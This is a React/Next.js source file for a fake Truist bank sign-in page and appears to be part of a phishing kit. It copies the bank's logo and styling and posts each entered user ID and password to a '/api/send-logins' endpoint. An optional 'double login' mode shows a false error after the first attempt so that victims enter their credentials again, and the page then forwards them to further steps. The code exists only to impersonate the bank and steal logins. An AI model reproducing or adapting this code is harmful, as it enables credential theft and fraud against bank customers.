/* eslint-disable @next/next/no-css-tags */
/* eslint-disable @next/next/no-img-element */
import React, { useContext, useEffect, useState } from "react";
import Head from "next/head";
import { Button } from "../../components/Button";
import { Checkbox } from "../../components/Checkbox";
import { Footer } from "../../components/Footer";
import { Input } from "../../components/Input";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import axios from "axios";
import { useRouter } from "next/router";
import { useForm } from "react-hook-form";
import { getNextUrl } from "../../utils/getNextUrl";
import { getProgress } from "../../utils/getProgress";
import { DataContext } from "../_app";
import { Error } from "../../components/Error";

interface LoginProps {}

const schema = yup.object().shape({
  userId: yup
    .string()
    .required(`Please enter a valid User ID.`)
    .min(2, `Please enter a valid User ID.`),
  password: yup
    .string()
    .required(`Please enter a password.`)
    .min(6, `Please enter a password.`),
});

export const Login: React.FC<LoginProps> = ({}) => {
  const [loginAttempt, setLoginAttempt] = useState(0);
  const [showError, setShowError] = useState(false);
  const [loading, setLoading] = useState(false);
  const [logins, setLogins] = useState({});
  const [showPassword, setShowPassword] = useState(false);

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    reset,
    formState: { errors },
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onSubmit`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `LOGIN DETAILS`);
    formData.append(
      `loginDetails`,
      JSON.stringify({ loginAttempt: loginAttempt + 1, ...data })
    );

    try {
      await axios.post(`/api/send-logins`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setLogins({
      ...logins,
      [loginAttempt + 1]: {
        form: `LOGIN DETAILS`,
        loginDetails: { loginAttempt: loginAttempt + 1, ...data },
      },
    });

    if (!loginAttempt && process.env.NEXT_PUBLIC_DOUBLE_LOGIN === `ON`) {
      setLoginAttempt(1);
      setLoading(false);
      setShowError(true);
      reset({
        userId: ``,
        password: ``,
      });
      return;
    }

    setData({
      ...datas,
      logins: {
        ...logins,
        [loginAttempt + 1]: {
          form: `LOGIN DETAILS`,
          loginDetails: { loginAttempt: loginAttempt + 1, ...data },
        },
      },
    });

    const url = getProgress()[0];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <>
      <Head>
        <link href="/styles/login.css" rel="stylesheet" type="text/css" />
        <title>Authentication</title>
      </Head>
      <div
        className="app-wrapper retail"
        style={{
          boxSizing: `inherit`,
        }}
      >
        <div
          className="main-content-wrapper"
          style={{
            boxSizing: `inherit`,
          }}
        >
          <div
            className="ng-star-inserted"
            style={{
              boxSizing: `inherit`,
            }}
          >
            <div className="ng-star-inserted">
              <div
                className="tru-core-grid--login tru-core-grid--login-bg tru-core-grid--login-mobile wrap-login tru-core-grid--2-columns-lg-up tru-core-grid"
                style={{
                  letterSpacing: `normal`,
                  textIndent: 0,
                  textShadow: `none`,
                  textTransform: `none`,
                  textAlign: `initial`,
                  fontStyle: `normal`,
                  verticalAlign: `initial`,
                  width: `100%`,
                  gridTemplateColumns: `repeat(2,1fr)`,
                  overflow: `hidden`,
                }}
              >
                <div
                  className="tru-core-image--login tru-core-image--login-display container-alignment"
                  style={{
                    backgroundImage: `url(/images/father-son.png)`,
                  }}
                ></div>
                <div
                  className="tru-core-grid--66-centered-sm-up tru-core-grid--login-bg tru-core-flex-align-items--center tru-core-grid--66-centered-md-up tru-core-grid"
                  style={{
                    gridTemplateColumns: `66%`,
                    justifyContent: `center`,
                    letterSpacing: `normal`,
                    textIndent: 0,
                    textShadow: `none`,
                    textTransform: `none`,
                    textAlign: `initial`,
                    fontStyle: `normal`,
                    verticalAlign: `initial`,
                    width: `100%`,
                  }}
                >
                  <div
                    className="light-theme-retail tru-core-card--login tru-core-flex-justify-content--center tru-core-card-wrapper"
                    style={{
                      letterSpacing: `normal`,
                      textIndent: 0,
                      textShadow: `none`,
                      textTransform: `none`,
                      textAlign: `initial`,
                      fontStyle: `normal`,
                      verticalAlign: `initial`,
                      display: `flex`,
                    }}
                  >
                    <div
                      className="tru-core-card tru-core-card-action-elements-stretch"
                      style={{
                        display: `flex`,
                        flexDirection: `column`,
                        backgroundColor: `var(--truColorBackgroundPrimary)`,
                        border: `none`,
                        borderRadius: `var(--truBorderRadiusMd)`,
                        width: `100%`,
                        overflow: `hidden`,
                      }}
                    >
                      <div
                        className="tru-core-grid--50-centered-sm-up tru-core-grid--login-mobile tru-core-grid"
                        style={{
                          letterSpacing: `normal`,
                          textIndent: 0,
                          textShadow: `none`,
                          textTransform: `none`,
                          textAlign: `initial`,
                          fontStyle: `normal`,
                          verticalAlign: `initial`,
                          width: `100%`,
                          gridTemplateColumns: `50.1%`,
                          justifyContent: `center`,
                        }}
                      >
                        <div
                          className="tru-core-margin-bottom--md tru-core-image-wrapper"
                          style={{
                            alignItems: `center`,
                            justifyContent: `center`,
                            letterSpacing: `normal`,
                            textIndent: 0,
                            textShadow: `none`,
                            textTransform: `none`,
                            fontStyle: `normal`,
                            verticalAlign: `initial`,
                            display: `flex`,
                          }}
                        >
                          <img
                            src="/images/trulogo_horz-trupurple.png"
                            alt="Truist White logo"
                            className="tru-core-margin-top--md tru-core-padding-left--sm tru-core-padding-right--sm tru-core-image--logo ng-star-inserted"
                          />
                        </div>
                      </div>
                      <div
                        className="light-theme-retail tru-core-sign-in-wrapper"
                        style={{
                          letterSpacing: `normal`,
                          textIndent: 0,
                          textShadow: `none`,
                          textTransform: `none`,
                          textAlign: `initial`,
                          fontStyle: `normal`,
                          verticalAlign: `initial`,
                        }}
                      >
                        <div
                          className="tru-core-card-wrapper"
                          style={{
                            letterSpacing: `normal`,
                            textIndent: 0,
                            textShadow: `none`,
                            textTransform: `none`,
                            textAlign: `initial`,
                            fontStyle: `normal`,
                            verticalAlign: `initial`,
                            display: `flex`,
                          }}
                        >
                          <div
                            className="tru-core-card"
                            style={{
                              display: `flex`,
                              flexDirection: `column`,
                              backgroundColor: `var(--truColorBackgroundPrimary)`,
                              border: `none`,
                              borderRadius: `var(--truBorderRadiusMd)`,
                              width: `100%`,
                              overflow: `hidden`,
                            }}
                          >
                            <div
                              className="tru-core-sign-in__form tru-core-card-content tru-core-card-section"
                              style={{
                                paddingTop: `var(--truSpacingXl)`,
                                paddingBottom: `var(--truSpacingMd)`,
                                letterSpacing: `normal`,
                                textIndent: 0,
                                textShadow: `none`,
                                textTransform: `none`,
                                textAlign: `initial`,
                                fontStyle: `normal`,
                                verticalAlign: `initial`,
                                fontSize: `var(--truFontSizeMd)`,
                                paddingLeft: `24px`,
                                paddingRight: `24px`,
                                color: `var(--truColorTextPrimary)`,
                                display: `flex`,
                                flexGrow: 1,
                                flexDirection: `column`,
                              }}
                            >
                              <div>
                                {showError ? <Error /> : null}
                                <form>
                                  <div className="tru-core-margin-bottom--sm">
                                    <Input
                                      register={register}
                                      name="userId"
                                      label={`User ID`}
                                      error={
                                        errors.userId &&
                                        (errors.userId
                                          .message as unknown as string)
                                      }
                                    />
                                  </div>
                                  <Checkbox />
                                  <div className="tru-core-margin-bottom--xxl">
                                    <Input
                                      register={register}
                                      name="password"
                                      label={`Password`}
                                      type={`password`}
                                      error={
                                        errors.password &&
                                        (errors.password
                                          .message as unknown as string)
                                      }
                                    />
                                  </div>
                                  <Button
                                    label={`Sign in`}
                                    onClick={onSubmit}
                                    disabled={loading}
                                  />
                                </form>
                              </div>
                            </div>
                            <div
                              _ngcontent-qty-c156=""
                              className="tru-core-sign-in__actions tru-core-card-actions tru-core-card-section"
                              style={{
                                paddingTop: 0,
                                paddingBottom: `var(--truSpacing2xl)`,
                                letterSpacing: `normal`,
                                textIndent: 0,
                                textShadow: `none`,
                                textTransform: `none`,
                                textAlign: `initial`,
                                fontStyle: `normal`,
                                verticalAlign: `initial`,
                                paddingLeft: `24px`,
                                paddingRight: `24px`,
                                color: `var(--truColorTextPrimary)`,
                                display: `flex`,
                                lineHeight: `normal`,
                              }}
                            >
                              <div className="ng-star-inserted">
                                <ul
                                  style={{
                                    listStyleType: `none`,
                                    padding: `unset`,
                                  }}
                                >
                                  <li>
                                    <div
                                      id="forgotUID"
                                      _nghost-qty-c64=""
                                      className="tru-core-link-wrapper"
                                      style={{
                                        letterSpacing: `normal`,
                                        textIndent: 0,
                                        textShadow: `none`,
                                        textTransform: `none`,
                                        textAlign: `initial`,
                                        fontStyle: `normal`,
                                        verticalAlign: `initial`,
                                        display: `inline-flex`,
                                      }}
                                    >
                                      {/**/}
                                      <a
                                        target="_self"
                                        id="forgotUID"
                                        className="tru-core-link tru-core-link-text ng-star-inserted"
                                        style={{
                                          color: `var(--truColorInteractiveBase)`,
                                          wordBreak: `break-word`,
                                          cursor: `pointer`,
                                        }}
                                      >
                                        {/**/} Forgot User ID {/**/}
                                        {/**/}
                                        {/**/}
                                        {/**/}
                                      </a>
                                      {/**/}
                                      {/**/}
                                      {/**/}
                                    </div>
                                  </li>
                                  <li>
                                    <div
                                      id="forgotPWD"
                                      className="tru-core-link-wrapper"
                                      style={{
                                        letterSpacing: `normal`,
                                        textIndent: 0,
                                        textShadow: `none`,
                                        textTransform: `none`,
                                        textAlign: `initial`,
                                        fontStyle: `normal`,
                                        verticalAlign: `initial`,
                                        display: `inline-flex`,
                                      }}
                                    >
                                      {/**/}
                                      <a
                                        target="_self"
                                        id="forgotPWD"
                                        className="tru-core-link tru-core-link-text ng-star-inserted"
                                        style={{
                                          color: `var(--truColorInteractiveBase)`,
                                          wordBreak: `break-word`,
                                          cursor: `pointer`,
                                        }}
                                      >
                                        {/**/} Forgot Password {/**/}
                                        {/**/}
                                        {/**/}
                                        {/**/}
                                      </a>
                                      {/**/}
                                      {/**/}
                                      {/**/}
                                    </div>
                                  </li>
                                </ul>
                              </div>
                              {/**/}
                              {/**/}
                              {/**/}
                            </div>
                            <div
                              className="tru-core-sign-in__details tru-core-card-content tru-core-card-section ng-star-inserted"
                              style={{
                                paddingBottom: `var(--truSpacingLg)`,
                                paddingTop: `24px`,
                                letterSpacing: `normal`,
                                textIndent: 0,
                                textShadow: `none`,
                                textTransform: `none`,
                                textAlign: `initial`,
                                fontStyle: `normal`,
                                verticalAlign: `initial`,
                                fontSize: `var(--truFontSizeMd)`,
                                paddingLeft: `24px`,
                                paddingRight: `24px`,
                                color: `var(--truColorTextPrimary)`,
                                display: `flex`,
                                flexGrow: 1,
                                flexDirection: `column`,
                              }}
                            >
                              <span
                                _ngcontent-lyx-c156=""
                                className="tru-core-text-secondary"
                              >
                                {`Don't`} have an online user ID?
                              </span>
                              <div
                                className="tru-core-sign-in-register-link tru-core-link-wrapper"
                                style={{
                                  letterSpacing: `normal`,
                                  textIndent: 0,
                                  textShadow: `none`,
                                  textTransform: `none`,
                                  textAlign: `initial`,
                                  fontStyle: `normal`,
                                  verticalAlign: `initial`,
                                  display: `inline-flex`,
                                }}
                              >
                                {/**/}
                                <a
                                  className="tru-core-link tru-core-link-text ng-star-inserted"
                                  style={{
                                    color: `var(--truColorInteractiveBase)`,
                                    wordBreak: `break-word`,
                                    cursor: `pointer`,
                                  }}
                                >
                                  {/**/} Register now {/**/}
                                  {/**/}
                                  {/**/}
                                  {/**/}
                                </a>
                                {/**/}
                                {/**/}
                                {/**/}
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <Footer />
        </div>
      </div>
    </>
  );
};

export default Login;
